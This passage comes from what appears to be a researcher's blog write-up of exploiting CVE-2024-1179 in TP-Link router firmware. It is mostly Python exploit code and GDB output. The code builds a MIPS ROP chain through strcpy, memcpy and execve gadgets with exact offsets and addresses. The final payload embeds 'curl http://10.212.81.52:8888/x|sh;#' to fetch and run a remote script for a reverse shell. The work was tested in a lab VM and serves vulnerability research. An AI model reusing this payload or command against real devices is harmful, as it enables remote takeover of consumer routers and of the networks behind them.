</span></span><span style="display:flex;"><span>w_region <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x42a600</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>gadget1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0040c4ac</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span> <span style="color:#75715e">## strcpy</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">417</span> <span style="color:#f92672">+</span> p32(w_region<span style="color:#f92672">+</span><span style="color:#ae81ff">0x80</span>) <span style="color:#f92672">+</span> p32(gadget1) <span style="color:#75715e"># here s0 at offset 417 need to be valid address</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">21</span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;command hop hop1 hip hop almpost secure ffffffffffffffffffffffff </span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74"> fffffffffffffffffff&#39;</span> <span style="color:#75715e">## our command (source content)</span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">17</span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cafe&#39;</span> <span style="color:#75715e"># ## next pc/ra --&gt; next gadget</span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">132</span><span style="color:#f92672">-</span>len(p1))
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span> p32(w_region) <span style="color:#75715e"># destination pointer</span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">300</span><span style="color:#f92672">-</span>len(p1))  <span style="color:#75715e">## padding (not necessary ath this moment)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload <span style="color:#f92672">+</span> p1
</span></span><span style="display:flex;"><span>aftr_name_option <span style="color:#f92672">=</span> code <span style="color:#f92672">+</span> (len(payload))<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">2</span>, byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>) <span style="color:#f92672">+</span> payload
</span></span></code></pre></div><p>Let&rsquo;s now execute this script and inspect what happens in GDB.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031145630.png"/><figcaption><h4> </h4></figcaption></figure>
<p>We can see in picture above that GDB stops at our next gadget <code>cafe</code>. We also see that this gadget effectively wrote our command at location  <code>0x42a600</code>.The command is truncated, but this is not a big problem at the moment, we will adjust it later. We also see that after the <code>restore</code> there is still enough data to handle the <code>execve</code> gadgets conditions.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031145953.png"/><figcaption><h4> </h4></figcaption></figure>
<p>But, let&rsquo;s do a simple recap. For our <code>execve</code> we need <code>argv</code> to be <code>['/bin/sh', '-c', command, NULL]</code>. With the <code>strcpy</code> gadget we have the command location and we already have <code>/bin/sh</code> location and we can easily write <code>NULL</code> into the stack. What remains is the <code>-c</code> strings location. First we can think that we can write it directly within the command strings by specifying something like <code>-c\x00\x00my_super_command</code>. But we can&rsquo;t, simply because we are using <code>strcpy</code> and <code>strcpy</code> will stop at null bytes. So we have to use the <code>strcpy</code> gadgets a second time to write <code>-c</code> strings. After some trial and error, we notice that because of the <code>restore 128</code> at the end using a second <code>strcpy</code> gadget increases too much the stack pointer so that we can no longer use our <code>execve</code> gadget to gain command execution.
Because of that, we will find another gadget that not increase the stack pointer too much. We then came across this <code>memcpy</code> gadget.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241030203006.png"/><figcaption><h4> </h4></figcaption></figure>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40c397</span><span style="color:#f92672">:</span>	lw	a0,<span style="color:#ae81ff">92</span>(sp)
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40c399</span><span style="color:#f92672">:</span>	li	a2,<span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40c39b</span><span style="color:#f92672">:</span>	jal	<span style="color:#ae81ff">0x419261</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40c39f</span><span style="color:#f92672">:</span>	addiu	a1,sp,<span style="color:#ae81ff">24</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40c3a1</span><span style="color:#f92672">:</span>	li	v0,<span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40c3a3</span><span style="color:#f92672">:</span>	restore	<span style="color:#ae81ff">88</span>,ra,s0<span style="color:#f92672">-</span>s1
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40c3a5</span><span style="color:#f92672">:</span>	jrc	ra
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40c3a7</span><span style="color:#f92672">:</span>	nop
</span></span></code></pre></div><p>Indeed, this gadget <code>restore</code> part is only increasing the stack pointer by <code>88</code> bytes. That is a good starting point. Furthermore, it loads <code>a0</code> (the destination) from stack pointer and also loads into <code>a1</code> a stack pointer which the content is under our control. This gadget will write only <code>0x10</code> bytes but we just need <code>0x4</code> bytes (<code>-c\x00\x00</code>).
We can now modify our script to use this gadget:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>gadget2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40c396</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span> <span style="color:#75715e"># memcpy</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">21</span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;command hop hop1 hip hop almpost secure ffffffffffffffffffffffff </span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74"> fffffffffffffffffff&#39;</span> <span style="color:#75715e">## our command (source content)</span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">17</span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span> p32(gadget2) <span style="color:#75715e"># ## next pc/ra --&gt; next gadget</span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">132</span><span style="color:#f92672">-</span>len(p1))
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span> p32(w_region) <span style="color:#75715e"># destination pointer</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p2<span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span> 
</span></span><span style="display:flex;"><span>p2<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;-c</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e">## -c strings</span>
</span></span><span style="display:flex;"><span>p2<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;z&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">84</span><span style="color:#f92672">-</span>len(p2)<span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>)
</span></span><span style="display:flex;"><span>p2<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;cafe&#39;</span> <span style="color:#75715e">### 3 - next pc/ra --&gt; next gadget</span>
</span></span><span style="display:flex;"><span>p2<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;babe&#39;</span>
</span></span><span style="display:flex;"><span>p2<span style="color:#f92672">+=</span> p32(w_region<span style="color:#f92672">+</span><span style="color:#ae81ff">0x50</span>) <span style="color:#75715e"># destination pointer</span>
</span></span><span style="display:flex;"><span>p2<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">300</span><span style="color:#f92672">-</span>len(p1)<span style="color:#f92672">-</span>len(p2))  <span style="color:#75715e">## padding (not necessary ath this moment)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload <span style="color:#f92672">+</span> p1 <span style="color:#f92672">+</span> p2
</span></span><span style="display:flex;"><span>aftr_name_option <span style="color:#f92672">=</span> code <span style="color:#f92672">+</span> (len(payload))<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">2</span>, byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>) <span style="color:#f92672">+</span> payload
</span></span></code></pre></div><p>Inspecting GDB, we can see that we have effectively written <code>-c</code> strings and have more bytes padding left.</p>
<p>

    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031152528.png"/><figcaption><h4> </h4></figcaption></figure>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031153121.png"/><figcaption><h4> </h4></figcaption></figure></p>
<p>Now we have everything we need to use the <code>execve</code> gadgets. But there is one more thing left.
Let&rsquo;s check the <code>execve</code> gadgets again:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>gef<span style="color:#f92672">&gt;</span> x<span style="color:#f92672">/</span><span style="color:#ae81ff">8</span>i <span style="color:#ae81ff">0x40a8b6</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a8b7</span><span style="color:#f92672">:</span>	lw	a2,<span style="color:#ae81ff">56</span>(sp)
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a8b9</span><span style="color:#f92672">:</span>	lw	a0,<span style="color:#ae81ff">136</span>(sp)
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a8bb</span><span style="color:#f92672">:</span>	jal	<span style="color:#ae81ff">0x419211</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a8bf</span><span style="color:#f92672">:</span>	addiu	a1,sp,<span style="color:#ae81ff">44</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a8c1</span><span style="color:#f92672">:</span>	jal	<span style="color:#ae81ff">0x4196e1</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x40a8c5</span><span style="color:#f92672">:</span>	nop
</span></span></code></pre></div><p><code>a0</code> will be populated from stack offset 136. With our current padding, this stack offset is out of control.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031153602.png"/><figcaption><h4> </h4></figcaption></figure>
<p>We need to increase the padding length. After some trial and error, we noticed that there is a maximum padding length that can still trigger the segfault at <code>cafe</code> address that is under our control as we saw earlier. This maximum length is <code>360</code>. If we use a padding length greater than this value, the program still crash and trigger segfault, but at a location that is not under our control (probably into one of the library function).
Let&rsquo;s use this maximum padding length(<code>360</code>) and see if our <code>execve</code> gadget <code>a0</code> argument can be a value that we control:</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031154436.png"/><figcaption><h4> </h4></figcaption></figure>
<p>That is cool, we are so lucky.</p>
<p>Now we can append our <code>execve</code> gadget to our ROP chain.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>gadget3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40a8b6</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span> <span style="color:#75715e"># execve</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p2<span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span>
</span></span><span style="display:flex;"><span>p2<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;-c</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e">## -c strings</span>
</span></span><span style="display:flex;"><span>p2<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;z&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">84</span><span style="color:#f92672">-</span>len(p2)<span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>)
</span></span><span style="display:flex;"><span>p2<span style="color:#f92672">+=</span> p32(gadget3) <span style="color:#75715e">### 3 - next pc/ra --&gt; next gadget</span>
</span></span><span style="display:flex;"><span>p2<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;babe&#39;</span>
</span></span><span style="display:flex;"><span>p2<span style="color:#f92672">+=</span> p32(w_region<span style="color:#f92672">+</span><span style="color:#ae81ff">0x50</span>) <span style="color:#75715e"># destination pointer</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p3<span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">36</span>
</span></span><span style="display:flex;"><span>p3<span style="color:#f92672">+=</span> p32(binsh_addr) <span style="color:#f92672">+</span> p32(w_region<span style="color:#f92672">+</span><span style="color:#ae81ff">0x50</span>) <span style="color:#f92672">+</span> p32(w_region) <span style="color:#75715e"># a1 = [&#39;/bin/sh&#39;, &#39;-c&#39;, command, a2=NULL]</span>
</span></span><span style="display:flex;"><span>p3<span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x0</span>) <span style="color:#75715e"># a2 = NULL = envp</span>
</span></span><span style="display:flex;"><span>p3<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">128</span><span style="color:#f92672">-</span>len(p3))
</span></span><span style="display:flex;"><span>p3<span style="color:#f92672">+=</span> p32(binsh_addr) <span style="color:#75715e">#a0 = &#39;/bin/sh&#39;</span>
</span></span><span style="display:flex;"><span>p3<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">358</span><span style="color:#f92672">-</span>len(p3)<span style="color:#f92672">-</span>len(p2) <span style="color:#f92672">-</span>len(p1))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload <span style="color:#f92672">+</span> p1 <span style="color:#f92672">+</span> p2 <span style="color:#f92672">+</span> p3
</span></span><span style="display:flex;"><span>aftr_name_option <span style="color:#f92672">=</span> code <span style="color:#f92672">+</span> (len(payload))<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">2</span>, byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>) <span style="color:#f92672">+</span> payload
</span></span></code></pre></div><p>Inspecting in GDB before the execution, we have:</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031155626.png"/><figcaption><h4> </h4></figcaption></figure>
<p>So everything is OK to execute our command. After the execution, we have the following on the qemu VM.</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031155758.png"/><figcaption><h4> </h4></figcaption></figure>
<p>Great. This means we have our remote command execution. But if we try to change the command we trigger a <code>Bus error</code> issue in GDB. After digging into it, we found that this is caused by one of the branch delay slot that we are not handling very well.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#f92672">-&gt;</span> <span style="color:#ae81ff">0x40c4bb</span> e870 <span style="color:#f92672">&lt;</span>NO_SYMBOL<span style="color:#f92672">&gt;</span> jrc ra
</span></span><span style="display:flex;"><span>	<span style="color:#ae81ff">0x40c4bd</span> <span style="color:#ae81ff">5e41</span> <span style="color:#f92672">&lt;</span>NO_SYMBOL<span style="color:#f92672">&gt;</span> sltiu a2, <span style="color:#ae81ff">112</span> Maybe delay<span style="color:#f92672">-</span>slot
</span></span></code></pre></div><p>This branch delay slot needed <code>a2</code> to be a valid address. After the fix we have the following working script (see the comments for explanation):</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>binsh_addr <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0041317c</span>
</span></span><span style="display:flex;"><span>w_region <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x42a600</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>gadget1 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0040c4ac</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span> <span style="color:#75715e">## strcpy</span>
</span></span><span style="display:flex;"><span>gadget2 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40c396</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span> <span style="color:#75715e"># memcpy</span>
</span></span><span style="display:flex;"><span>gadget3 <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40a8b6</span><span style="color:#f92672">+</span><span style="color:#ae81ff">1</span> <span style="color:#75715e"># execve</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">417</span> <span style="color:#f92672">+</span> p32(w_region<span style="color:#f92672">+</span><span style="color:#ae81ff">0x80</span>) <span style="color:#f92672">+</span> p32(gadget1) <span style="color:#75715e"># here s0 at offset 417 need to be valid address</span>
</span></span><span style="display:flex;"><span>p1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;commandhophop1hiphopalmpostsecurefffffffffffffffffffff &#39;</span> <span style="color:#75715e">## our command (source content)</span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">120</span><span style="color:#f92672">-</span>len(p1))
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">-&gt; 0x40c4bb e870 &lt;NO_SYMBOL&gt; jrc ra
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0x40c4bd 5e41 &lt;NO_SYMBOL&gt; sltiu a2, 112 Maybe delay-slot
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span> p32(w_region<span style="color:#f92672">+</span><span style="color:#ae81ff">0x70</span>) <span style="color:#75715e">## Fix delay-slot (a2 need to be a valid pointer to avoid Bus error)</span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span> p32(gadget2) <span style="color:#75715e"># ## next pc/ra --&gt; next gadget</span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">132</span><span style="color:#f92672">-</span>len(p1))
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span> p32(w_region) <span style="color:#75715e"># destination pointer</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p2<span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;b&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">16</span> <span style="color:#75715e">## If we choose b for exemple we will face the 0x2e (.) aftr_name, to avoid jsut extend the length</span>
</span></span><span style="display:flex;"><span>p2<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;-c</span><span style="color:#ae81ff">\x00\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#75715e">## -c strings</span>
</span></span><span style="display:flex;"><span>p2<span style="color:#f92672">+=</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;z&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">84</span><span style="color:#f92672">-</span>len(p2)<span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>)
</span></span><span style="display:flex;"><span>p2<span style="color:#f92672">+=</span> p32(gadget3) <span style="color:#75715e">### 3 - next pc/ra --&gt; next gadget</span>
</span></span><span style="display:flex;"><span>p2<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;babe&#39;</span>
</span></span><span style="display:flex;"><span>p2<span style="color:#f92672">+=</span> p32(w_region<span style="color:#f92672">+</span><span style="color:#ae81ff">0x50</span>) <span style="color:#75715e"># destination pointer</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p3<span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">36</span>
</span></span><span style="display:flex;"><span>p3<span style="color:#f92672">+=</span> p32(binsh_addr) <span style="color:#f92672">+</span> p32(w_region<span style="color:#f92672">+</span><span style="color:#ae81ff">0x50</span>) <span style="color:#f92672">+</span> p32(w_region) <span style="color:#75715e"># a1 = [&#39;/bin/sh&#39;, &#39;-c&#39;, command, a2=NULL]</span>
</span></span><span style="display:flex;"><span>p3<span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x0</span>) <span style="color:#75715e"># a2 = NULL = envp</span>
</span></span><span style="display:flex;"><span>p3<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">128</span><span style="color:#f92672">-</span>len(p3))
</span></span><span style="display:flex;"><span>p3<span style="color:#f92672">+=</span> p32(binsh_addr) <span style="color:#75715e">#a0 = &#39;/bin/sh&#39;</span>
</span></span><span style="display:flex;"><span>p3<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;c&#39;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">358</span><span style="color:#f92672">-</span>len(p3)<span style="color:#f92672">-</span>len(p2) <span style="color:#f92672">-</span>len(p1))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> payload <span style="color:#f92672">+</span> p1 <span style="color:#f92672">+</span> p2 <span style="color:#f92672">+</span> p3
</span></span><span style="display:flex;"><span>aftr_name_option <span style="color:#f92672">=</span> code <span style="color:#f92672">+</span> (len(payload))<span style="color:#f92672">.</span>to_bytes(<span style="color:#ae81ff">2</span>, byteorder<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;big&#39;</span>) <span style="color:#f92672">+</span> payload
</span></span></code></pre></div><p>And in the VM after the execution, we have:</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031165744.png"/><figcaption><h4> </h4></figcaption></figure>
<p>Perfect ! the <code>.</code> is there because the binary wrote it there to conform with the <code>AFTR_NAME</code>. This will not cause any damage to our exploitation , we can handle it easily.
Now the question is what command we will run. As we want a reverse shell and that we have a tiny space before the <code>.</code> we will just execute a command to download a bash file that will contain the final payload and execute it. We can do it simply with curl:
<code>curl http://addresse:port/x|sh;#</code>
The <code>#</code> is there to filter the rest of command so that it will be considered as comment and will not be executed.
On the sub-net we created our host address is <code>10.212.81.52</code> and we choose to serve the bash file on port <code>8888</code>. So our command is: <code>curl http://10.212.81.52:8888/x|sh;#</code></p>
<pre tabindex="0"><code>br0: flags=4419&lt;UP,BROADCAST,RUNNING,PROMISC,MULTICAST&gt;  mtu 1500
        inet 10.212.81.52  netmask 255.255.0.0  broadcast 10.212.255.255
        inet6 fe80::542b:76ce:631b:36ce  prefixlen 64  scopeid 0x20&lt;link&gt;
        ether da:30:2c:48:59:a8  txqueuelen 1000  (Ethernet)
        RX packets 2477143  bytes 1947827351 (1.9 GB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 1312938  bytes 229493321 (229.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
</code></pre><p>The python script is now:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span>p1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">24</span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;curl http://10.212.81.52:8888/x|sh;#&#39;</span> <span style="color:#75715e">## our command (source content)</span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">120</span><span style="color:#f92672">-</span>len(p1))
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">-&gt; 0x40c4bb e870 &lt;NO_SYMBOL&gt; jrc ra
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">0x40c4bd 5e41 &lt;NO_SYMBOL&gt; sltiu a2, 112 Maybe delay-slot
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span> p32(w_region<span style="color:#f92672">+</span><span style="color:#ae81ff">0x70</span>) <span style="color:#75715e">## Fix delay-slot (a2 need to be a valid pointer to avoid Bus error)</span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span> p32(gadget2) <span style="color:#75715e"># ## next pc/ra --&gt; next gadget</span>
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;a&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">132</span><span style="color:#f92672">-</span>len(p1))
</span></span><span style="display:flex;"><span>p1<span style="color:#f92672">+=</span> p32(w_region) <span style="color:#75715e"># destination pointer</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">.</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">.</span>
</span></span></code></pre></div><p>And after execution:</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031174000.png"/><figcaption><h4> </h4></figcaption></figure>
<p>The file that will be downloaded can be something like this:</p>


    <figure><img src="https://dilagluc.github.io/2024/tplink_cve_2024_1179/Pasted%20image%2020241031172944.png"/><figcaption><h4> </h4></figcaption></figure>
